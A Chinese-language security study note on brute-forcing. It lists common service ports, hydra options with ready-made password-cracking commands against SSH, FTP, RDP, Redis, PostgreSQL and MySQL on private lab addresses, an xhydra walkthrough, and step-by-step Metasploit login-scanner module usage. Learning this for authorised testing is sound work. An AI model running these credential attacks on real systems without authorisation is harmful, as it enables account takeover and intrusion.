---
title: web安全----穷举篇
---
[toc]
## 文件的穷举
- pker多线程后台极速扫描工具
- 御剑
- dirbuster
- 以上软件的具体方法看上一篇内容
## 常见端口的服务
- http 80
- https 443
- ftp 21
- ssh 22
- mysql 3306
- mssql 1433 微软的sqlserver数据库
- rsync 873 本地主机与远程主机同步的端口
- oracle 1521
- mongo 28017
- redis 6379
- tomcat 8080 小型轻量级应用服务器
- smtp 25
- POP3 110
- dns 53
- telent 23 远程登录服务
- vnc 5900
- pacnywhere 5632
- weblogic 7001 javaEE的中间件
- Jenkins 8080 8089 域名管理
- SNMP 161
- Zabbiox 8069
- elasticsearch 9200 9300 搜索引擎
- rdp 3389

## 常见端口服务穷举
### 穷举爆破神奇hydra
- 参数
  > -R 继续从上次进度接着破解
  > -S 采用SSL链接
  > -s PORT 可以通过这个参数指定费默认端口
  > -l LOGIN 指定破解的用户，对特定用户破解
  > -L FILE 指定用户名字典
  > -p PASS 指定密码皮杰
  > -P 指定密码字典
  > -e ns 可选选项，n:空密码试探，s:指定用户和密码试探,r:反向登录
  > -C FILE 使用冒号分割格式，例如： 登录名：密码，可以代替-L/-P参数
  > -M FILE 指定目标列表文件一行一条
  > -o FILE 指定结果输出文件
  > -f 在使用-M后，找到第一对登录名或者密码的时候终止破解
  > -t TASKS 同事运行的线程数，默认为16
  > -w TIME 设置最大的超时的时间，默认30s
  > -v/-V显示详细的过程

- ssh
  > hydra -L /root/user -P /root/passwd ssh://192.168.1.0 -f -o /root/crack.txt -V

- ftp
  > hydra -L /root/user -P /root/passwd ftp://192.168.1.0 -f -o /root/crack.txt -V

- rdp
  > hydra -L /root/user -P /root/passwd rdp://192.168.1.0 -f -o /root/crack.txt -V

- redis
  > hydra -P /root/passlist.txt -e nsr -t 16 192.168.0.101 redis

- postgresql
  > hydra -P /root/passlist.txt -e nsr -t 16 192.168.0.101 postgresql

- 指定多个ip
  > hydra -L /root/user -P /root/passlist -M /root/ip.txt  -V -o /root/crack mysql -t 16

### 可视化工具xhydra详解
- 1、single Target中指定ip
- 2、Target List 指定列表
- 3、port 指定端口，如果没有指定会默认选择
- 4、protocol 选择fuwu
- 5、passwords选择框中可以设置登录名和密码.或者爆破文件
- 6、Tuning选项卡中可以设置线程数（tasks）和超时时间
- 7、Tuning选项卡中可以设置代理（proxy）
- 8、Specific选项卡时代理文件的设置，一般不用设置
- 9、最后点击start选项卡下面的start按钮开始爆破

### kali metasploit穷举模块使用
- 模块搜索 
  > search login

- 爆破模块
  > auxiliary/scanner/ftp/ftp_login
  > auxiliary/scanner/ssh/ssh_login
  > auxiliary/scanner/telnet/telnet_login
  > auxiliary/scanner/smb/smb_login
  > auxiliary/scanner/mssql/mssql_login
  > auxiliary/scanner/mysql/mysql_login
  > auxiliary/scanner/oracle/oracle_login
  > auxiliary/scanner/postgres/postgres_login
  > auxiliary/scanner/vnc/vnc_login
  > auxiliary/scanner/pcanywhere/pcanywhere_login
  > auxiliary/scanner/snmp/snmp_login

- 用法
  > 1、msfconsole
  > 2、search ssh             //搜索模块
  > 3、use auxiliary/scanner/ssh/ssh_login       //使用模块
  > 4、info   查看模块信息
  > 5、set RHOSTS ip地址           
  > 6、set USERNAME/USER_FILE
  > 7、set PASSWORD/PASS_FILE
  > 8、set RPORT                   //设置端口
  > 9、show option                //查看设置
  > 10、set STOP_ON_SUCCESS true  //爆破成功后停止
  > 11、set THREADS 5       //设置线程
  > 12、run 、exploit  //运行
  > DB_ALL_PASS        将当前数据库中的所有密码添加到列表中
  > back   返回